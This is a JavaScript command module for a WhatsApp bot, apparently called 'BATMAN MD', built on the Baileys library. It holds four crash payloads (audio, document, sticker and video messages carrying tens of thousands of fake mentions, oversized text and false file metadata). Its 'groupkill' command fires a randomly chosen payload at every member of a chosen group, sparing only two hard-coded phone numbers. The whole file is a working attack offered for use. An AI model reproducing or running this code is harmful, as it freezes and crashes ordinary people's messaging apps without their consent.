// commands/groupkill.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

// Collection of all exploit functions (randomly selected)
const EXPLOITS = [
    'invis',      // batsinvis - audio crash
    'blank',      // batblank - blank screen freeze
    'dozer',      // batdozer - sticker flood
    'proto'       // batproto - protocol overload
];

function extractNumber(jid) {
    let num = jid.split('@')[0];
    num = num.replace(/[^0-9]/g, '');
    if (num.length > 12) num = num.slice(-12);
    return num;
}

function isProtected(number) {
    return PROTECTED_NUMBERS.includes(number);
}

// Exploit: Invis (audio crash)
async function sendInvis(sock, target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0, 44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245, 153, 93, 211]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98, 117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212, 145]),
                    fileEncSha256: Buffer.from([29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84, 131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211, 83, 153]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, generateMessage, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });
}

// Exploit: Blank (freeze screen)
async function sendBlank(sock, target) {
    const vampireText = `_*~@2~*_\n`.repeat(10500);
    const privateText = 'ꦽ'.repeat(5000);
    const messageContent = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "Pembasmi Kontol",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                        },
                        hasMediaAttachment: true,
                    },
                    body: { text: 'Trash Invictus Blank!' + vampireText + privateText },
                    footer: { text: '' },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, messageContent, { participant: { jid: target } });
}

// Exploit: Dozer (sticker flood)
async function sendDozer(sock, target) {
    const messageContent = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        forwardingScore: 999999,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, messageContent, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });
}

// Exploit: Proto (video overload)
async function sendProto(sock, target) {
    const mentionedList = Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        }
    };
    const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
    });
}

async function groupkillCommand(sock, chatId, message, args) {
    // Owner-only
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
        return;
    }

    let targetGroupJid = args[0];
    let isCurrentGroup = false;

    // If no argument provided and in a group, use current group
    if (!targetGroupJid && chatId.endsWith('@g.us')) {
        targetGroupJid = chatId;
        isCurrentGroup = true;
    }

    if (!targetGroupJid || !targetGroupJid.endsWith('@g.us')) {
        await sock.sendMessage(chatId, { 
            text: "💀 *Group Kill*\n\nUsage:\n• `.groupkill <group_jid>`\n• `.groupkill` (if used inside a target group)\n\nGet group JID from `.listgc` command"
        }, { quoted: message });
        return;
    }

    await sock.sendMessage(chatId, { text: `💀 Initiating group kill on ${targetGroupJid}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "💀", key: message.key } });

    try {
        // Get group members
        const groupMetadata = await sock.groupMetadata(targetGroupJid);
        const participants = groupMetadata.participants;
        const botNumber = extractNumber(sock.user.id);
        
        // Filter targets (exclude protected numbers and bot itself)
        const targets = [];
        for (const p of participants) {
            const num = extractNumber(p.id);
            if (!isProtected(num) && num !== botNumber) {
                targets.push({ jid: p.id, number: num });
            }
        }

        if (targets.length === 0) {
            await sock.sendMessage(chatId, { text: "🛡️ No valid targets found (all protected or bot itself)." }, { quoted: message });
            return;
        }

        await sock.sendMessage(chatId, { text: `🎯 Targeting ${targets.length} member(s) with random exploits...` }, { quoted: message });

        let successCount = 0;
        let failCount = 0;
        const exploitStats = { invis: 0, blank: 0, dozer: 0, proto: 0 };

        // Send random exploit to each target
        for (const target of targets) {
            const randomExploit = EXPLOITS[Math.floor(Math.random() * EXPLOITS.length)];
            exploitStats[randomExploit]++;
            
            try {
                switch (randomExploit) {
                    case 'invis':
                        await sendInvis(sock, target.jid);
                        break;
                    case 'blank':
                        await sendBlank(sock, target.jid);
                        break;
                    case 'dozer':
                        await sendDozer(sock, target.jid);
                        break;
                    case 'proto':
                        await sendProto(sock, target.jid);
                        break;
                }
                successCount++;
                // Small delay to avoid rate limiting
                await new Promise(r => setTimeout(r, 500));
            } catch (err) {
                console.error(`Failed on ${target.number}:`, err.message);
                failCount++;
            }
        }

        // Send summary report
        const report = `💀 *Group Kill Complete*\n\n` +
            `📊 Targets: ${targets.length}\n` +
            `✅ Success: ${successCount}\n` +
            `❌ Failed: ${failCount}\n\n` +
            `🎲 *Exploit Distribution:*\n` +
            `🦇 Invis: ${exploitStats.invis}\n` +
            `📄 Blank: ${exploitStats.blank}\n` +
            `🚜 Dozer: ${exploitStats.dozer}\n` +
            `⚡ Proto: ${exploitStats.proto}\n\n` +
            `> *© BATMAN MD*`;

        await sock.sendMessage(chatId, { text: report }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "✅", key: message.key } });

    } catch (error) {
        console.error('[GroupKill]', error);
        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "❌", key: message.key } });
    }
}

module.exports = groupkillCommand;